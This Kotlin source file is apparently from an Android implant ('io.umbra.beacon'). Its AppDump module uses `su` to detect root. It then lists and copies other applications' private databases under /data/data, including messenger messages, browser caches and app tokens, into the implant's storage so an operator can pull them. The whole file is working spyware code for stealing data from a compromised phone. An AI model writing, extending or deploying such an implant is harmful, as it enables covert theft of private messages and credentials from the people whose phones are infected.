package io.umbra.beacon

import android.content.Context
import java.io.File
import java.util.concurrent.TimeUnit

/**
 * The databases of the applications of the phone.
 *
 * The private storage of an application lives under
 * `/data/data/<package>/`, and it holds the messages of the messengers,
 * the cache of the browsers and the tokens of the applications.  The
 * directory belongs to the application that owns it, so reading it needs
 * the privileges of that application.
 *
 * The implant says the truth about it:
 *
 *   * without root the databases of the *other* applications are not
 *     readable, and the answer says that instead of pretending the
 *     phone has no messages;
 *   * with root the implant copies the files into its own storage, where
 *     the operator can pull them with the ordinary `download` task;
 *   * the databases of the implant itself are always readable, and they
 *     are the ones the engagement produced.
 */
object AppDump {
    /** How long a command on the phone may run. */
    const val TIMEOUT_MS = 20_000L

    /** The root of the private storage of the applications. */
    const val DATA_ROOT = "/data/data"

    /**
     * Is the phone rooted?
     *
     * The check runs `su`, and the answer is the identity it printed: a
     * phone that has a `su` that says "no" is not rooted, and a phone
     * that has no `su` at all is not rooted either.
     */
    fun rooted(): Boolean {
        val output = shell("id") ?: return false
        return output.contains("uid=0")
    }

    /**
     * The databases of an application.
     *
     * The answer is a report: the rows are the files, and the notes say
     * what the platform did.
     */
    fun dump(context: Context, packageName: String, path: String, directory: String): Sense.Report {
        val report = Sense.Report("app.dump")
        if (packageName.isEmpty()) {
            report.note("the dump needs args.package: the application to read")
            return report
        }
        val relative = if (path.isEmpty()) "databases" else path
        val root = rooted()
        report.note("the phone is " + if (root) "rooted" else "not rooted")
        if (!root && packageName != context.packageName) {
            report.note(
                "the storage of another application is not readable without root; " +
                    "the answer lists the own databases of the implant instead",
            )
            ownDatabases(context, report)
            return report
        }
        val source = if (packageName == context.packageName) {
            context.filesDir.absolutePath
        } else {
            "$DATA_ROOT/$packageName/$relative"
        }
        val listing = shell("ls -l $source")
        if (listing == null) {
            report.note("the directory $source could not be listed")
            ownDatabases(context, report)
            return report
        }
        for (line in listing.lines()) {
            val name = line.trim().substringAfterLast(' ')
            if (name.isEmpty() || name == "." || name == "..") continue
            report.row(
                "package" to packageName,
                "path" to "$source/$name",
                "size" to line.trim().split(" ").getOrNull(4) ?: "",
            )
        }
        if (packageName == context.packageName) {
            ownDatabases(context, report)
            return report
        }
        // With root the files are copied into the storage of the implant,
        // where the operator can pull them.
        val target = File(directory, "dump-$packageName")
        if (!target.isDirectory && !target.mkdirs()) {
            report.note("the directory $target could not be created")
            return report
        }
        val copy = shell("cp -f $source/* $target/ 2>/dev/null; chown -R ${uid(context)}:${uid(context)} $target")
        if (copy == null) {
            report.note("the files could not be copied into the storage of the implant")
            return report
        }
        for (file in target.listFiles() ?: emptyArray()) {
            report.row(
                "package" to packageName,
                "path" to file.absolutePath,
                "size" to "${file.length()}",
                "copied" to "yes",
            )
        }
        return report
    }

    /** The databases of the implant itself. */
    private fun ownDatabases(context: Context, report: Sense.Report) {
        val databases = File(context.applicationInfo.dataDir, "databases")
        if (!databases.isDirectory) return
        for (file in databases.listFiles() ?: emptyArray()) {
            report.row(
                "package" to context.packageName,
                "path" to file.absolutePath,
                "size" to "${file.length()}",
                "copied" to "own",
            )
        }
    }

    /** The user the implant runs as. */
    private fun uid(context: Context): String {
        return try {
            android.os.Process.myUid().toString()
        } catch (_: Throwable) {
            "0"
        }
    }

    /**
     * Run a command on the phone.
     *
     * The implant has no shell the operator can use, so the command runs
     * through `su`: a phone without root answers with an error and the
     * caller says so.
     */
    private fun shell(command: String): String? {
        return try {
            val process = ProcessBuilder("su", "-c", command)
                .redirectErrorStream(true)
                .start()
            process.outputStream.close()
            val output = process.inputStream.bufferedReader().readText()
            if (!process.waitFor(TIMEOUT_MS, TimeUnit.MILLISECONDS)) {
                process.destroyForcibly()
                return null
            }
            output
        } catch (_: Throwable) {
            null
        }
    }
}
